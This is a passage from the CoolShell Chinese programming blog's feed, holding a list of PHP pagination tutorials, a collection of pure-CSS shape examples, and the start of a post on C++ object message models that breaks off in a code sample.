<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#9_Php_Page" title="9) Php Page">9) Php Page</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#10_perfect-php-pagination" title="10) perfect-php-pagination">10) perfect-php-pagination</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="1_%E4%BD%BF%E7%94%A8Ajax%E5%88%86%E9%A1%B5"></span>1)<a href="http://www.9lessons.info/2010/10/pagination-with-jquery-php-ajax-and.html"> 使用Ajax分页</a><span class="ez-toc-section-end"></span>
</h4>
<p> </p>
<p> </p>
<p style="text-align: left;">下面这个示例使用了jQuery + PHP。 <a href="http://demos.9lessons.info/pagination/pagination.php">Demo link</a></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;"><span id="more-5160"></span></p>
<h4>
<span class="ez-toc-section" id="2_MySql_%E5%88%86%E9%A1%B5"></span>2) <a href="http://php.about.com/od/phpwithmysql/ss/php_pagination.htm">MySql 分页</a><span class="ez-toc-section-end"></span>
</h4>
<p> </p>
<p style="text-align: left;">数据库的分页处理。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="3_FacebookTwitter_%E9%A3%8E%E6%A0%BC%E7%9A%84%E5%88%86%E9%A1%B5"></span>3)<a href="http://youhack.me/2010/05/14/an-alternative-to-pagination-facebook-and-twitter-style/"> Facebook/Twitter 风格的分页</a><span class="ez-toc-section-end"></span>
</h4>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="4_Php_MySql_%E5%88%86%E9%A1%B5"></span>4)<a href="http://www.phpeasystep.com/phptu/29.html"> Php &amp; MySql 分页</a><span class="ez-toc-section-end"></span>
</h4>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="5_%E5%88%86%E9%A1%B5%E9%A3%8E%E6%A0%BC"></span>5)<a href="http://www.bitrepository.com/css-stylish-pagination-links.html"> 分页风格</a><span class="ez-toc-section-end"></span>
</h4>
<p> </p>
<p style="text-align: left;">一个简单的教程教你如何用CSS定义不同风格的分页。</p>
<p><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="6_PHP_%E5%88%86%E9%A1%B5%E7%B1%BB"></span>6) <a href="http://phpsense.com/php/php-pagination-script.html" target="_blank">PHP 分页类</a><span class="ez-toc-section-end"></span>
</h4>
<p> </p>
<p style="text-align: left;">一个PHP的分页类</p>
<p><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="7_Easy_Pagination"></span>7)<a href="http://www.phpeasycode.com/pagination/"> Easy Pagination</a><span class="ez-toc-section-end"></span>
</h4>
<p>这是一个PHP库，可以让你更容易的做分页。<br>
<img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="8_%E5%9F%BA%E6%9C%AC%E5%88%86%E9%A1%B5"></span>8 ) <a href="http://www.phpfreaks.com/tutorial/basic-pagination">基本分页</a><span class="ez-toc-section-end"></span>
</h4>
<p> </p>
<p style="text-align: left;">一个很不错简单易懂的分页教程。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="9_Php_Page"></span>9)<a href="http://www.developphp.com/view_lesson.php?v=289"> Php Page</a><span class="ez-toc-section-end"></span>
</h4>
<h3></h3>
<p style="text-align: left;">一个简单的PHP的教程</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="10_perfect-php-pagination"></span>10) <a href="http://www.sitepoint.com/perfect-php-pagination/" target="_blank">perfect-php-pagination</a><span class="ez-toc-section-end"></span>
</h4>
<p> </p>
<p style="text-align: left;">也是一个分页教程。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">（全文完）</p>
<p></p>
 ]]></content>
<pubDate>2011-08-14T14:49:22+08:00</pubDate>
<guid>https://coolshell.cn/articles/5160.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ CSS图形 ]]></title>
<link>https://coolshell.cn/articles/5164.html</link>
<content><![CDATA[ 
<p>下面的示例展示了使用纯CSS制作的各种图形，你可以自由地修改文中的CSS代码。这个收集的<a href="https://css-tricks.com/examples/ShapesOfCSS/?=derp" target="_blank">原文在这里</a>。</p>
<p> 经测试，IE9, Chrome, FF, Safari都可以正常显示。</p>
<style type="text/css">
.shape {
    padding: 20px;
}
.shape > style {
    display: block;
    white-space: pre;
    background: #333;
    color: white;
    font: 12px Monaco;
    padding: 0 15px;
}
.shape > div {
    margin: 20px ;
}
.shape > h5 {
    border-style:none none double none;
    /*padding: 10px;
    text-indent: 60px;
    margin: 50px 0 0 -70px;*/
    position: relative;
    font: bold italic 20px "atrament-web-1","atrament-web-2", Georgia, Serif;
    color:#333;
}
.shape > h5 > a {
    position: absolute;
    right: 20px;
    bottom: 10px;
    font-size: 20px;
}
</style>
<div class="shape">
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%AD%A3%E6%96%B9%E5%BD%A2" title="正方形">正方形</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-2" href="#%E9%95%BF%E6%96%B9%E5%BD%A2" title="长方形">长方形</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%9C%86%E5%BD%A2" title="圆形">圆形</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%A4%AD%E5%9C%86%E5%BD%A2" title="椭圆形">椭圆形</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%90%91%E4%B8%8A%EF%BC%89" title="三角形（向上）">三角形（向上）</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%90%91%E4%B8%8B%EF%BC%89" title="三角形（向下）">三角形（向下）</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%90%91%E5%B7%A6%EF%BC%89" title="三角形（向左）">三角形（向左）</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-8" href="#%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%90%91%E5%8F%B3%EF%BC%89" title="三角形（向右）">三角形（向右）</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-9" href="#%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%B7%A6%E4%B8%8A%EF%BC%89" title="三角形（左上）">三角形（左上）</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%8F%B3%E4%B8%8A%EF%BC%89" title="三角形（右上）">三角形（右上）</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-11" href="#%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%B7%A6%E4%B8%8B%EF%BC%89" title="三角形（左下）">三角形（左下）</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%8F%B3%E4%B8%8B%EF%BC%89" title="三角形（右下）">三角形（右下）</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#%E5%B9%B3%E8%A1%8C%E5%9B%9B%E8%BE%B9%E8%A1%8C" title="平行四边行">平行四边行</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-14" href="#%E6%A2%AF%E5%BD%A2" title="梯形">梯形</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-15" href="#%E5%85%AD%E8%A7%92%E6%98%9F%E5%BD%A2" title="六角星形">六角星形</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-16" href="#%E4%BA%94%E8%A7%92%E6%98%9F%E5%BD%A2_via_Kit_MacAllister" title="五角星形 via Kit MacAllister">五角星形 via Kit MacAllister</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-17" href="#%E4%BA%94%E8%BE%B9%E5%BD%A2" title="五边形">五边形</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-18" href="#%E5%85%AD%E8%BE%B9%E5%BD%A2" title="六边形">六边形</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-19" href="#%E5%85%AB%E8%BE%B9%E5%BD%A2" title="八边形">八边形</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-20" href="#%E5%BF%83%E5%BD%A2_via_Nicolas_Gallagher" title="心形 via Nicolas Gallagher">心形 via Nicolas Gallagher</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-21" href="#%E6%97%A0%E7%A9%B7%E5%A4%A7_via_Nicolas_Gallagher" title="无穷大 via Nicolas Gallagher">无穷大 via Nicolas Gallagher</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-22" href="#%E8%8F%B1%E5%BD%A2" title="菱形">菱形</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-23" href="#%E9%B8%A1%E8%9B%8B" title="鸡蛋">鸡蛋</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-24" href="#%E5%90%83%E8%B1%86%E4%BA%BA" title="吃豆人">吃豆人</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-25" href="#%E8%AF%B4%E8%AF%9D%E6%B3%A1%E6%B3%A1" title="说话泡泡">说话泡泡</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-26" href="#12%E6%98%9F%E5%BD%A2_via_Alan_Johnson" title="12星形 via Alan Johnson">12星形 via Alan Johnson</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-27" href="#8%E6%98%9F%E5%BD%A2_via_Alan_Johnson" title="8星形 via Alan Johnson">8星形 via Alan Johnson</a></li>
</ul></nav>
</div>
<h5>
<span class="ez-toc-section" id="%E6%AD%A3%E6%96%B9%E5%BD%A2"></span>正方形<span class="ez-toc-section-end"></span>
</h5>
<div id="square"></div>
<style contenteditable> 
#square {
	width: 100px;
	height: 100px;
	background: #f66;
}
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E9%95%BF%E6%96%B9%E5%BD%A2"></span>长方形<span class="ez-toc-section-end"></span>
</h5>
<div id="rectangle"></div>
<style contenteditable> 
#rectangle {
	width: 200px;
	height: 100px;
	background: #f66;
}
            </style>

</div>
<p><span id="more-5164"></span> </p>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E5%9C%86%E5%BD%A2"></span>圆形<span class="ez-toc-section-end"></span>
</h5>
<div id="circle"></div>
<style contenteditable> 
#circle {
	width: 100px;
	height: 100px;
	background: #f66;
	-moz-border-radius: 50px;
	-webkit-border-radius: 50px;
	border-radius: 50px;
}
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E6%A4%AD%E5%9C%86%E5%BD%A2"></span>椭圆形<span class="ez-toc-section-end"></span>
</h5>
<div id="oval"></div>
<style contenteditable> 
#oval {
	width: 200px;
	height: 100px;
	background: #f66;
	-moz-border-radius: 100px / 50px;
	-webkit-border-radius: 100px / 50px;
	border-radius: 100px / 50px;
}
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%90%91%E4%B8%8A%EF%BC%89"></span>三角形（向上）<span class="ez-toc-section-end"></span>
</h5>
<div id="triangle-up"></div>
<style contenteditable> 
#triangle-up {
	width: 0;
	height: 0;
	border-left: 50px solid transparent;
	border-right: 50px solid transparent;
	border-bottom: 100px solid #f66;
}
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%90%91%E4%B8%8B%EF%BC%89"></span>三角形（向下）<span class="ez-toc-section-end"></span>
</h5>
<div id="triangle-down"></div>
<style contenteditable> 
#triangle-down {
	width: 0;
	height: 0;
	border-left: 50px solid transparent;
	border-right: 50px solid transparent;
	border-top: 100px solid #f66;
}				
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%90%91%E5%B7%A6%EF%BC%89"></span>三角形（向左）<span class="ez-toc-section-end"></span>
</h5>
<div id="triangle-left"></div>
<style contenteditable> 
#triangle-left {
	width: 0;
	height: 0;
	border-top: 50px solid transparent;
	border-right: 100px solid #f66;
	border-bottom: 50px solid transparent;
}
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%90%91%E5%8F%B3%EF%BC%89"></span>三角形（向右）<span class="ez-toc-section-end"></span>
</h5>
<div id="triangle-right"></div>
<style contenteditable> 
#triangle-right {
	width: 0;
	height: 0;
	border-top: 50px solid transparent;
	border-left: 100px solid #f66;
	border-bottom: 50px solid transparent;
}</style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%B7%A6%E4%B8%8A%EF%BC%89"></span>三角形（左上）<span class="ez-toc-section-end"></span>
</h5>
<div id="triangle-topleft"></div>
<style contenteditable> 
#triangle-topleft {
	width: 0;
	height: 0;
	border-top: 100px solid #f66; 
	border-right: 100px solid transparent;			
}
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%8F%B3%E4%B8%8A%EF%BC%89"></span>三角形（右上）<span class="ez-toc-section-end"></span>
</h5>
<div id="triangle-topright"></div>
<style contenteditable> 
#triangle-topright {
	width: 0;
	height: 0;
	border-top: 100px solid #f66; 
	border-left: 100px solid transparent;
}
</style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%B7%A6%E4%B8%8B%EF%BC%89"></span>三角形（左下）<span class="ez-toc-section-end"></span>
</h5>
<div id="triangle-bottomleft"></div>
<style contenteditable> 
#triangle-bottomleft {
	width: 0;
	height: 0;
	border-bottom: 100px solid #f66; 
	border-right: 100px solid transparent;	
}		
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E4%B8%89%E8%A7%92%E5%BD%A2%EF%BC%88%E5%8F%B3%E4%B8%8B%EF%BC%89"></span>三角形（右下）<span class="ez-toc-section-end"></span>
</h5>
<div id="triangle-bottomright"></div>
<style contenteditable> 
#triangle-bottomright {
	width: 0;
	height: 0;
	border-bottom: 100px solid #f66; 
	border-left: 100px solid transparent;
}				
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E5%B9%B3%E8%A1%8C%E5%9B%9B%E8%BE%B9%E8%A1%8C"></span>平行四边行<span class="ez-toc-section-end"></span>
</h5>
<div id="parallelogram"></div>
<style contenteditable> 
#parallelogram {
	width: 150px;
	height: 100px;
	-webkit-transform: skew(20deg);
	   -moz-transform: skew(20deg);
	     -o-transform: skew(20deg);
	background: #f66;
}
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E6%A2%AF%E5%BD%A2"></span>梯形<span class="ez-toc-section-end"></span>
</h5>
<div id="trapezoid"></div>
<style contenteditable> 
#trapezoid {
	border-bottom: 100px solid #f66;
	border-left: 50px solid transparent;
	border-right: 50px solid transparent;
	height: 0;
	width: 100px;
}
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E5%85%AD%E8%A7%92%E6%98%9F%E5%BD%A2"></span>六角星形<span class="ez-toc-section-end"></span>
</h5>
<div id="star-six"></div>
<style contenteditable> 
#star-six {
	width: 0;
	height: 0;
	border-left: 50px solid transparent;
	border-right: 50px solid transparent;
	border-bottom: 100px solid #f66;
	position: relative;
        margin: 20px 0px 50px 20px;
}
#star-six:after {
	width: 0;
	height: 0;
	border-left: 50px solid transparent;
	border-right: 50px solid transparent;
	border-top: 100px solid #f66;
	position: absolute;
	content: "";
	top: 30px;
	left: -50px;
}
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E4%BA%94%E8%A7%92%E6%98%9F%E5%BD%A2_via_Kit_MacAllister"></span>五角星形 <a href="http://kitmacallister.com/2011/css-only-5-point-star/">via Kit MacAllister</a><span class="ez-toc-section-end"></span>
</h5>
<div id="star-five"></div>
<style contenteditable> 
#star-five {
   margin: 80px 0;
   position: relative;
   display: block;
   color: #f66;
   width: 0px;
   height: 0px;
   border-right:  100px solid transparent;
   border-bottom: 70px  solid #f66;
   border-left:   100px solid transparent;
   -moz-transform:    rotate(35deg);
   -webkit-transform: rotate(35deg);
   -ms-transform:     rotate(35deg);
   -o-transform:      rotate(35deg);
}
#star-five:before {
   border-bottom: 80px solid #f66;
   border-left: 30px solid transparent;
   border-right: 30px solid transparent;
   position: absolute;
   height: 0;
   width: 0;
   top: -45px;
   left: -65px;
   display: block;
   content: '';
   -webkit-transform: rotate(-35deg);
   -moz-transform:    rotate(-35deg);
   -ms-transform:     rotate(-35deg);
   -o-transform:      rotate(-35deg);
}
#star-five:after {
   position: absolute;
   display: block;
   color: #f66;
   top: 3px;
   left: -105px;
   width: 0px;
   height: 0px;
   border-right: 100px solid transparent;
   border-bottom: 70px solid #f66;
   border-left: 100px solid transparent;
   -webkit-transform: rotate(-70deg);
   -moz-transform:    rotate(-70deg);
   -ms-transform:     rotate(-70deg);
   -o-transform:      rotate(-70deg);
   content: '';
}
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E4%BA%94%E8%BE%B9%E5%BD%A2"></span>五边形<span class="ez-toc-section-end"></span>
</h5>
<div id="pentagon"></div>
<style contenteditable> 
#pentagon {
    position: relative;
    width: 54px;
    border-width: 50px 18px 0;
    border-style: solid;
    border-color: #f66 transparent;
    margin: 50px 0px 20px 20px;
}
#pentagon:before {
    content: "";
    position: absolute;
    height: 0;
    width: 0;
    top: -85px;
    left: -18px;
    border-width: 0 45px 35px;
    border-style: solid;
    border-color: transparent transparent #f66;
}
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E5%85%AD%E8%BE%B9%E5%BD%A2"></span>六边形<span class="ez-toc-section-end"></span>
</h5>
<div id="hexagon"></div>
<style contenteditable> 
#hexagon {
	width: 100px;
	height: 55px;
	background: #f66;
	position: relative;
        margin: 50px 0px 50px 20px;
}
#hexagon:before {
	content: "";
	position: absolute;
	top: -25px; 
	left: 0;
	width: 0;
	height: 0;
	border-left: 50px solid transparent;
	border-right: 50px solid transparent;
	border-bottom: 25px solid #f66;
}
#hexagon:after {
	content: "";
	position: absolute;
	bottom: -25px; 
	left: 0;
	width: 0;
	height: 0;
	border-left: 50px solid transparent;
	border-right: 50px solid transparent;
	border-top: 25px solid #f66;
}</style>
</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E5%85%AB%E8%BE%B9%E5%BD%A2"></span>八边形<span class="ez-toc-section-end"></span>
</h5>
<div id="octagon"></div>
<style contenteditable> 
#octagon {
	width: 100px;
	height: 100px;
	background: #f66;
	position: relative;
}
#octagon:before {
	content: "";
	position: absolute;
	top: 0;
	left: 0;    
	border-bottom: 29px solid #f66;
	border-left: 29px solid #fff;
	border-right: 29px solid #fff;
	width: 42px;
	height: 0;
}
#octagon:after {
	content: "";
	position: absolute;
	bottom: 0;
	left: 0;    
	border-top: 29px solid #f66;
	border-left: 29px solid #fff;
	border-right: 29px solid #fff;
	width: 42px;
	height: 0;
}
            </style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E5%BF%83%E5%BD%A2_via_Nicolas_Gallagher"></span>心形 <a href="http://nicolasgallagher.com/">via Nicolas Gallagher</a><span class="ez-toc-section-end"></span>
</h5>
<div id="heart"></div>
<style contenteditable> 
#heart {
    position: relative;
    width: 100px;
    height: 90px;
}
#heart:before,
#heart:after {
    position: absolute;
    content: "";
    left: 50px;
    top: 0;
    width: 50px;
    height: 80px;
    background: #f66;
    -moz-border-radius: 50px 50px 0 0;
    border-radius: 50px 50px 0 0;
    -webkit-transform: rotate(-45deg);
       -moz-transform: rotate(-45deg);
        -ms-transform: rotate(-45deg);
         -o-transform: rotate(-45deg);
            transform: rotate(-45deg);
    -webkit-transform-origin: 0 100%;
       -moz-transform-origin: 0 100%;
        -ms-transform-origin: 0 100%;
         -o-transform-origin: 0 100%;
            transform-origin: 0 100%;
}
#heart:after {
    left: 0;
    -webkit-transform: rotate(45deg);
       -moz-transform: rotate(45deg);
        -ms-transform: rotate(45deg);
         -o-transform: rotate(45deg);
            transform: rotate(45deg);
    -webkit-transform-origin: 100% 100%;
       -moz-transform-origin: 100% 100%;
        -ms-transform-origin: 100% 100%;
         -o-transform-origin: 100% 100%;
            transform-origin :100% 100%;
}
</style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E6%97%A0%E7%A9%B7%E5%A4%A7_via_Nicolas_Gallagher"></span>无穷大 <a href="http://nicolasgallagher.com/">via Nicolas Gallagher</a><span class="ez-toc-section-end"></span>
</h5>
<div id="infinity"></div>
<style contenteditable> 
#infinity {
    position: relative;
    width: 212px;
    height: 100px;
}
#infinity:before,
#infinity:after {
    content: "";
    position: absolute;
    top: 0;
    left: 0;
    width: 60px;
    height: 60px;    
    border: 20px solid #f66;
    -moz-border-radius: 50px 50px 0 50px;
         border-radius: 50px 50px 0 50px;
    -webkit-transform: rotate(-45deg);
       -moz-transform: rotate(-45deg);
        -ms-transform: rotate(-45deg);
         -o-transform: rotate(-45deg);
            transform: rotate(-45deg);
}
#infinity:after {
    left: auto;
    right: 0;
    -moz-border-radius: 50px 50px 50px 0;
         border-radius: 50px 50px 50px 0;
    -webkit-transform: rotate(45deg);
       -moz-transform: rotate(45deg);
        -ms-transform: rotate(45deg);
         -o-transform: rotate(45deg);
            transform: rotate(45deg);
}</style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E8%8F%B1%E5%BD%A2"></span>菱形<span class="ez-toc-section-end"></span>
</h5>
<div id="diamond"></div>
<style scoped contenteditable> 
#diamond {
   width: 80px; 
   height: 80px; 
   background: #f66;
   margin: 50px 20px 20px 60px;
   -webkit-transform: rotate(-45deg);
   -moz-transform:    rotate(-45deg);
   -ms-transform:     rotate(-45deg);
   -o-transform: rotate(-45deg);
   transform: rotate(-45deg);
   -webkit-transform-origin: 0 100%;
   -moz-transform-origin: 0 100%;
   -ms-transform-origin: 0 100%;
   -o-transform-origin: 0 100%;
   transform-origin: 0 100%;
}</style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E9%B8%A1%E8%9B%8B"></span>鸡蛋<span class="ez-toc-section-end"></span>
</h5>
<div id="egg"></div>
<style scoped contenteditable> 
#egg {
   display:block;
   width: 126px; 
   height: 180px;
   background-color: #f66;
   -webkit-border-radius: 63px 63px 63px 63px / 108px 108px 72px 72px;
   border-radius:        50%   50%  50%  50%  / 60%   60%   40%  40%;
}</style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E5%90%83%E8%B1%86%E4%BA%BA"></span>吃豆人<span class="ez-toc-section-end"></span>
</h5>
<div id="pacman"></div>
<style scoped contenteditable> 
#pacman {
  width: 0px;
  height: 0px;
  border-right: 60px solid transparent;
  border-top: 60px solid #f66;
  border-left: 60px solid #f66;
  border-bottom: 60px solid #f66;
  border-top-left-radius: 60px;
  border-top-right-radius: 60px;
  border-bottom-left-radius: 60px;
  border-bottom-right-radius: 60px;
}</style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="%E8%AF%B4%E8%AF%9D%E6%B3%A1%E6%B3%A1"></span>说话泡泡<span class="ez-toc-section-end"></span>
</h5>
<div id="talkbubble"></div>
<style scoped contenteditable> 
#talkbubble {
   width: 120px; 
   height: 80px; 
   background: #f66;
   position: relative;
   -moz-border-radius:    10px; 
   -webkit-border-radius: 10px; 
   border-radius:         10px;
}
#talkbubble:before {
   content:"";
   position: absolute;
   right: 100%;
   top: 26px;
   width: 0;
   height: 0;
   border-top: 13px solid transparent;
   border-right: 26px solid #f66;
   border-bottom: 13px solid transparent;
}</style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="12%E6%98%9F%E5%BD%A2_via_Alan_Johnson"></span>12星形 <a href="http://commondream.net/post/8848553728/pure-css-badges">via Alan Johnson</a><span class="ez-toc-section-end"></span>
</h5>
<div id="burst-12"></div>
<style scoped contenteditable> 
#burst-12 {
    background: #f66;
    width: 80px;
    height: 80px;
    position: relative;
    text-align: center;
}
#burst-12:before, #burst-12:after {
    content: "";
    position: absolute;
    top: 0;
    left: 0;
    height: 80px;
    width: 80px;
    background: #f66;
}
#burst-12:before {
    -webkit-transform: rotate(30deg);
       -moz-transform: rotate(30deg);
        -ms-transform: rotate(30deg);
         -o-transform: rotate(30deg);
            transform: rotate(30deg);
}
#burst-12:after {
    -webkit-transform: rotate(60deg);
       -moz-transform: rotate(60deg);
        -ms-transform: rotate(60deg);
         -o-transform: rotate(60deg);
            transform: rotate(60deg);
}</style>

</div>
<div class="shape">
<h5>
<span class="ez-toc-section" id="8%E6%98%9F%E5%BD%A2_via_Alan_Johnson"></span>8星形 <a href="http://commondream.net/post/8848553728/pure-css-badges">via Alan Johnson</a><span class="ez-toc-section-end"></span>
</h5>
<div id="burst-8"></div>
<style scoped contenteditable> 
#burst-8 {
    background: #f66;
    width: 80px;
    height: 80px;
    position: relative;
    text-align: center;
    -webkit-transform: rotate(20deg);
       -moz-transform: rotate(20deg);
        -ms-transform: rotate(20deg);
         -o-transform: rotate(20eg);
            transform: rotate(20deg);
}
#burst-8:before {
    content: "";
    position: absolute;
    top: 0;
    left: 0;
    height: 80px;
    width: 80px;
    background: #f66;
    -webkit-transform: rotate(135deg);
       -moz-transform: rotate(135deg);
        -ms-transform: rotate(135deg);
         -o-transform: rotate(135deg);
            transform: rotate(135deg);
}</style>
</div>
<p>(全文完)</p>
<p></p>
 ]]></content>
<pubDate>2011-08-15T08:21:50+08:00</pubDate>
<guid>https://coolshell.cn/articles/5164.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 对象的消息模型 ]]></title>
<link>https://coolshell.cn/articles/5202.html</link>
<content><![CDATA[ 
<p><strong><span style="color: #cc0000;">[ ———— 感谢</span> <a href="https://www.cnblogs.com/weidagang2046/" target="_blank">Todd 同学</a> <span style="color: #cc0000;">投递本文，<a href="https://www.cnblogs.com/weidagang2046/archive/2011/08/14/2138059.html" target="_blank">原文链接</a> ———— ]</span></strong></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#C%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B" title="C++对象模型">C++对象模型</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%B6%88%E6%81%AF%E6%A8%A1%E5%9E%8B" title="对象的消息模型">对象的消息模型</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Method_Missing" title="Method Missing">Method Missing</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%8F%82%E8%80%83" title="参考">参考</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="C%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B"></span><strong>C++对象模型</strong><span class="ez-toc-section-end"></span>
</h4>
<p>话题从下面这段C++程序说起，你认为它可以顺利执行吗？</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">//C++
class A {
    public:
        void Hello(const std::string&amp; name) {
